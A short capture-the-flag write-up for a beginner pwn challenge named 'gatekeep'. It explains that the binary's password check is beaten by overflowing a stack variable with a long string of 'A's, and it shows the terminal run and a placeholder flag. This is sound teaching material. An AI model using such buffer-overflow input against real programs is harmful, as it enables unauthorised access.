+++
authors = ["laozi"]
title = "pwn/gatekeep"
date = "2023-02-12"
+++

### The challenge

This is one of the baby intro challenges, so it just checked if your input
was the same as the program's variable on the stack. You just need to send
a bunch of "A"s to the program to get the flag.

```bash
❯ ./gatekeep
If I gaslight you enough, you won't be able to guess my password! :)
Password:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
I swore that was the right password ...
Guess I couldn't gaslight you!
flag{ASDASDSADFASDFGASDFASDF}
```
